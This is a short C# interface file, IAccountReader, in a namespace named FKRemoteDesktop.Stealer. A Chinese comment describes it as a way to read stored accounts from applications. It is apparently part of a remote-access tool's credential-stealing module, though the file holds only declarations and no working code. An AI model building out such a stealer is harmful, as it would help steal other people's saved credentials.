using FKRemoteDesktop.Message.MessageStructs;
using System.Collections.Generic;

//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Stealer
{
    // 从应用程序中读取存储账号的方法
    public interface IAccountReader
    {
        IEnumerable<RecoveredAccount> ReadAccounts();

        string ApplicationName { get; }
        string KeyName { get; }
    }
}